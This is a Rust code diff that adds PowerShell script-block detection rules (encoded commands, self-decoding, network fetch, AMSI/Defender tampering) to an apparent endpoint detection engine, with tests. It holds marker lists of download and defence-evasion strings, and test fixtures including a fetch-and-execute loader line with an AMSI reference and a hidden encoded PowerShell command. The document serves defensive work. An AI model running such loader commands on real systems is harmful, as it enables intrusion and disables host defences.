@@ -171,6 +171,10 @@ pub fn evaluate(event: &TelemetryEvent, facts: &Facts<'_>) -> Vec<Finding> {
         high_abuse_tld,
         novel_binary_in_writable_location,
         process_fanout_burst,
+        script_block_encoded_command,
+        script_block_obfuscated,
+        script_block_remote_fetch,
+        script_block_defence_evasion,
     ] {
         if let Some(finding) = rule(event, facts) {
             findings.push(finding);
@@ -213,6 +217,175 @@ fn encoded_interpreter(event: &TelemetryEvent, facts: &Facts<'_>) -> Option<Find
             evidence(0.72, 0.020)
         },
         detail: format!("encoded command line, hidden={hidden}").into(),
+    })
+}
+
+/// T1590 has no bearing here; these are the tells in what an interpreter was
+/// asked to run, read from a script block rather than a command line.
+///
+/// Why this is worth having at all: `Microsoft-Windows-Kernel-Process` carries no
+/// command line on any Windows build, so the `encoded_interpreter` rule above can
+/// only fire if something else supplies one. A 4104 does, for PowerShell, and it
+/// carries the *whole script* rather than the first 260 characters of a command
+/// line — which is where a staged loader keeps its payload.
+///
+/// Every rule here reads only the text and reports only which pattern matched. It
+/// does not quote the script: an alert body is minimised before it leaves the host
+/// (A19), and the script is the most sensitive thing on the machine.
+fn script_block(event: &TelemetryEvent) -> Option<&model::ScriptBlock> {
+    match &event.kind {
+        EventKind::ScriptBlock(block) => Some(block),
+        _ => None,
+    }
+}
+
+/// How long a base64-looking run has to be before it is an encoded command rather
+/// than a word that happens to end in `-enc`.
+const MIN_ENCODED_BLOB: usize = 20;
+
+/// Whether `text` contains an argument that hands the interpreter an encoded
+/// command.
+///
+/// Deliberately not a bare `-e `: that matches English prose. What is checked is
+/// the `-enc` family followed by a token long enough and shaped enough to be
+/// base64, which is the thing an analyst cannot read.
+fn has_encoded_command(text: &str) -> bool {
+    let lower = lower(text);
+    if lower.contains("-encodedcommand") || lower.contains("-encodedarguments") {
+        return true;
+    }
+
+    for marker in ["-enc ", "-enc(", "-ec ", "-en "] {
+        let Some(at) = lower.find(marker) else {
+            continue;
+        };
+        let blob = lower[at + marker.len()..].trim_start();
+        let run = blob
+            .split(|c: char| c.is_whitespace() || c == '\'' || c == '"')
+            .next()
+            .unwrap_or_default();
+        if run.len() >= MIN_ENCODED_BLOB
+            && run
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
+        {
+            return true;
+        }
+    }
+    false
+}
+
+/// T1059.001: PowerShell handed an encoded command through the script itself.
+fn script_block_encoded_command(event: &TelemetryEvent, _facts: &Facts<'_>) -> Option<Finding> {
+    let block = script_block(event)?;
+    if !has_encoded_command(&block.text) {
+        return None;
+    }
+
+    Some(Finding {
+        rule: "script_block_encoded_command",
+        technique: "T1059.001",
+        // Stronger than the command-line version of the same tell: a script that
+        // encodes an argument rather than writing it is doing so on purpose.
+        likelihood: evidence(0.80, 0.015),
+        detail: "script block passes an encoded command".into(),
+    })
+}
+
+/// Patterns that exist to make a script unreadable rather than to do work.
+const OBFUSCATION_MARKERS: &[&str] = &[
+    "frombase64string",
+    "invoke-expression",
+    "iex(",
+    "iex ",
+    "|iex",
+    "[scriptblock]::create",
+    "-bxor",
+    "-join[char",
+    "[char[]]",
+    "[text.encoding]::",
+];
+
+/// T1140: the script decodes or assembles itself before running.
+fn script_block_obfuscated(event: &TelemetryEvent, _facts: &Facts<'_>) -> Option<Finding> {
+    let block = script_block(event)?;
+    let lower = lower(&block.text);
+    let marker = OBFUSCATION_MARKERS.iter().find(|m| lower.contains(**m))?;
+
+    Some(Finding {
+        rule: "script_block_obfuscated",
+        technique: "T1140",
+        // `Invoke-Expression` on its own is common in real automation, so this is
+        // deliberately weaker than the encoding rule above and says which pattern
+        // it matched so an analyst can judge it.
+        likelihood: evidence(0.55, 0.030),
+        detail: format!("script block contains {marker}").into(),
+    })
+}
+
+/// Ways a script reaches out for something it will then run.
+const REMOTE_FETCH_MARKERS: &[&str] = &[
+    "downloadstring",
+    "downloaddata",
+    "downloadfile",
+    "net.webclient",
+    "start-bitstransfer",
+    "invoke-webrequest",
+    "invoke-restmethod",
+    "wget ",
+    "curl ",
+];
+
+/// T1105: the script fetches something over the network.
+///
+/// Weak on its own — plenty of legitimate automation downloads — which is why the
+/// likelihood is modest and the threshold is what decides. A fetch *and* an
+/// execution pattern is what an intrusion looks like, and the two findings add.
+fn script_block_remote_fetch(event: &TelemetryEvent, _facts: &Facts<'_>) -> Option<Finding> {
+    let block = script_block(event)?;
+    let lower = lower(&block.text);
+    let marker = REMOTE_FETCH_MARKERS.iter().find(|m| lower.contains(**m))?;
+
+    Some(Finding {
+        rule: "script_block_remote_fetch",
+        technique: "T1105",
+        likelihood: evidence(0.45, 0.050),
+        detail: format!("script block contains {marker}").into(),
+    })
+}
+
+/// Attempts to switch the defences off from inside a script.
+const DEFENCE_EVASION_MARKERS: &[&str] = &[
+    "amsiutils",
+    "amsiinitfailed",
+    "amsiscanbuffer",
+    "set-mppreference",
+    "add-mppreference",
+    "exclusionpath",
+    "exclusionprocess",
+    "disableantispyware",
+    "disablebehaviormonitoring",
+    "disableioavprotection",
+];
+
+/// T1562.001: the script tampers with the security product on the host.
+///
+/// The narrowest rule in the file, and the strongest per false positive: real
+/// automation has almost no reason to touch AMSI or Defender exclusions from
+/// inside a script block, and malware has no other way to get its payload past
+/// the scanner.
+fn script_block_defence_evasion(event: &TelemetryEvent, _facts: &Facts<'_>) -> Option<Finding> {
+    let block = script_block(event)?;
+    let lower = lower(&block.text);
+    let marker = DEFENCE_EVASION_MARKERS
+        .iter()
+        .find(|m| lower.contains(**m))?;
+
+    Some(Finding {
+        rule: "script_block_defence_evasion",
+        technique: "T1562.001",
+        likelihood: evidence(0.65, 0.005),
+        detail: format!("script block contains {marker}").into(),
     })
 }
 
@@ -407,6 +580,10 @@ pub fn rule_title(rule: &str) -> &'static str {
         "high_abuse_tld" => "Resolution in a high-abuse namespace",
         "novel_binary_in_writable_location" => "First sighting of a binary in a writable location",
         "process_fanout_burst" => "Unusual process fan-out",
+        "script_block_encoded_command" => "PowerShell script with an encoded command",
+        "script_block_obfuscated" => "PowerShell script that decodes itself",
+        "script_block_remote_fetch" => "PowerShell script fetching from the network",
+        "script_block_defence_evasion" => "PowerShell script touching the defences",
         _ => "Suspicious activity",
     }
 }
@@ -449,6 +626,129 @@ mod tests {
 
     fn rule_names(findings: &[Finding]) -> Vec<&str> {
         findings.iter().map(|f| f.rule).collect()
+    }
+
+    /// A PowerShell script block, as the sensor would build one from a 4104.
+    fn script_block(text: &str) -> TelemetryEvent {
+        event(EventKind::ScriptBlock(model::ScriptBlock {
+            pid: ProcessId::new(100),
+            text: text.into(),
+            script_block_id: Some("{block}".into()),
+            path: None,
+            message_number: Some(1),
+            message_total: Some(1),
+            recorded_at: chrono::Utc::now(),
+        }))
+    }
+
+    #[test]
+    fn an_encoded_command_in_a_script_block_is_strong_evidence() {
+        // The whole point of supporting 4104: the process provider carries no
+        // command line on any Windows build, so without this T1059.001 can only
+        // fire on a fixture.
+        let e = script_block(
+            "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA",
+        );
+        let findings = evaluate(&e, &Facts::default());
+        assert_eq!(rule_names(&findings), vec!["script_block_encoded_command"]);
+        assert_eq!(findings[0].technique, "T1059.001");
+        assert!(findings[0].likelihood.log_ratio() > 3.0, "must be strong");
+    }
+
+    #[test]
+    fn an_encoded_command_is_not_confused_with_prose_ending_in_e() {
+        // A bare `-e ` used to be enough, and it matches English. What is checked
+        // now is the argument shape, so a script that merely mentions the word
+        // stays quiet.
+        for innocent in [
+            "Write-Host 'see -e below'",
+            "Get-ChildItem -enc",
+            "Write-Output 'the -enc flag is undocumented'",
+            "$x = -enc",
+        ] {
+            let findings = evaluate(&script_block(innocent), &Facts::default());
+            assert!(
+                !rule_names(&findings).contains(&"script_block_encoded_command"),
+                "{innocent} must not read as an encoded command"
+            );
+        }
+
+        // A short run of characters after `-enc` is a token, not a payload.
+        assert!(!has_encoded_command("run -enc abc"));
+        // A long one is a payload.
+        assert!(has_encoded_command(&format!(
+            "run -enc {}",
+            "QUJD".repeat(10)
+        )));
+    }
+
+    #[test]
+    fn a_loader_fires_several_rules_and_they_add_up() {
+        // The realistic shape: fetch, decode, run, with the defences turned off.
+        // Separate findings rather than one verdict is the A5 design, so this
+        // asserts the count and that the techniques differ.
+        let e = script_block(
+            "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1');\
+             [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');",
+        );
+        let findings = evaluate(&e, &Facts::default());
+        let names = rule_names(&findings);
+        assert!(names.contains(&"script_block_obfuscated"), "{names:?}");
+        assert!(names.contains(&"script_block_remote_fetch"), "{names:?}");
+        assert!(names.contains(&"script_block_defence_evasion"), "{names:?}");
+
+        let techniques: Vec<&str> = findings.iter().map(|f| f.technique).collect();
+        assert!(techniques.contains(&"T1140"), "{techniques:?}");
+        assert!(techniques.contains(&"T1105"), "{techniques:?}");
+        assert!(techniques.contains(&"T1562.001"), "{techniques:?}");
+
+        // Summed, this is not a close call.
+        let total: f64 = findings.iter().map(|f| f.likelihood.log_ratio()).sum();
+        assert!(total > 8.0, "a full loader should be overwhelming: {total}");
+    }
+
+    #[test]
+    fn ordinary_administration_stays_quiet() {
+        // A rule that fires on every script is worse than no rule, and the shapes
+        // below are what a real estated admin script looks like.
+        for innocent in [
+            "Get-Service | Where-Object { $_.Status -eq 'Stopped' } | Start-Service",
+            "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties LastLogonDate",
+            "Get-ChildItem -Path C:\\Logs -Filter *.log | Remove-Item -WhatIf",
+            "Write-Output 'deployment complete'",
+            "$servers | ForEach-Object { Invoke-Command -ComputerName $_ { Get-Date } }",
+        ] {
+            let findings = evaluate(&script_block(innocent), &Facts::default());
+            assert!(
+                findings.is_empty(),
+                "{innocent} produced {:?}",
+                rule_names(&findings)
+            );
+        }
+    }
+
+    #[test]
+    fn the_script_rules_only_read_script_blocks() {
+        // The same text on a command line is the other rule's business. Firing
+        // here as well would double-count one piece of evidence.
+        let e = process_start(
+            "powershell.exe",
+            Some("powershell -enc SQBFAFgAKABOAGUAdwA"),
+        );
+        let findings = evaluate(&e, &Facts::default());
+        let names = rule_names(&findings);
+        assert_eq!(names, vec!["encoded_powershell"]);
+        assert!(!names.iter().any(|n| n.starts_with("script_block_")));
+    }
+
+    #[test]
+    fn a_script_block_reports_which_pattern_matched_and_not_the_script() {
+        // The body is minimised before it leaves the host (A19) and the script is
+        // the most sensitive thing on the machine, so the detail names the tell.
+        let e = script_block("$c = 'topsecret'; IEX $c");
+        let finding = evaluate(&e, &Facts::default()).remove(0);
+        assert_eq!(finding.detail.as_ref(), "script block contains iex ");
+        assert!(!finding.detail.contains("topsecret"));
     }
 
     #[test]
